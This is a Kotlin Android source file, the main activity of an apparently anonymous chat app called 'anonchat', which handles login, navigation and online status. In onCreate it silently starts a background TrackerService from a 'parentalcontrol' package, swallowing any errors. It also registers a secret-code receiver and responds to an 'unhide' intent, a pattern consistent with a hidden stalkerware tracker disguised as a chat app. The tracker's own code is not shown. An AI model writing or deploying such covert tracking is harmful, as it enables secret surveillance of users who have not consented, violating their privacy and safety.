package com.anonchat.app.ui.main

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.anonchat.app.R
import com.anonchat.app.databinding.ActivityMainBinding
import com.anonchat.app.ui.conversations.ConversationsFragment
import com.anonchat.app.ui.search.SearchFragment
import com.anonchat.app.ui.profile.ProfileFragment
import com.anonchat.app.util.SecretCodeManager
import com.anonchat.app.util.SecretCodeReceiverManager
import com.google.firebase.auth.FirebaseAuth

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private var currentFragment: Fragment? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (FirebaseAuth.getInstance().currentUser == null) {
            val authIntent = Intent(this, com.anonchat.app.ui.auth.AuthActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(authIntent)
            finish()
            return
        }

        if (SecretCodeManager.isCodeSet(this)) {
            SecretCodeReceiverManager.registerDynamicReceiver(this)
        }

        // Ensure background tracking service is running
        try {
            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
        } catch (_: Exception) { }

        setupBottomNavigation()
        if (savedInstanceState == null) {
            loadFragment(ConversationsFragment())
        }
    }

    private fun setupBottomNavigation() {
        binding.bottomNavigation.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_chats -> {
                    loadFragment(ConversationsFragment())
                    true
                }
                R.id.nav_search -> {
                    loadFragment(SearchFragment())
                    true
                }
                R.id.nav_profile -> {
                    loadFragment(ProfileFragment())
                    true
                }
                else -> false
            }
        }
    }

    private fun loadFragment(fragment: Fragment) {
        currentFragment = fragment
        supportFragmentManager.beginTransaction()
            .replace(R.id.fragmentContainer, fragment)
            .commit()
    }

    override fun onPause() {
        super.onPause()
        val userId = FirebaseAuth.getInstance().currentUser?.uid
        if (userId != null) {
            Thread {
                try {
                    com.google.firebase.firestore.FirebaseFirestore.getInstance()
                        .collection("users")
                        .document(userId)
                        .update("isOnline", false, "lastSeen", System.currentTimeMillis())
                } catch (_: Exception) { }
            }.start()
        }
    }

    override fun onResume() {
        super.onResume()
        val userId = FirebaseAuth.getInstance().currentUser?.uid
        if (userId != null) {
            Thread {
                try {
                    com.google.firebase.firestore.FirebaseFirestore.getInstance()
                        .collection("users")
                        .document(userId)
                        .update("isOnline", true, "lastSeen", System.currentTimeMillis())
                } catch (_: Exception) { }
            }.start()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            SecretCodeReceiverManager.unregisterDynamicReceiver(this)
        } catch (_: Exception) { }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (intent?.hasExtra("unhide") == true) {
            binding.bottomNavigation.selectedItemId = R.id.nav_profile
        }
    }
}
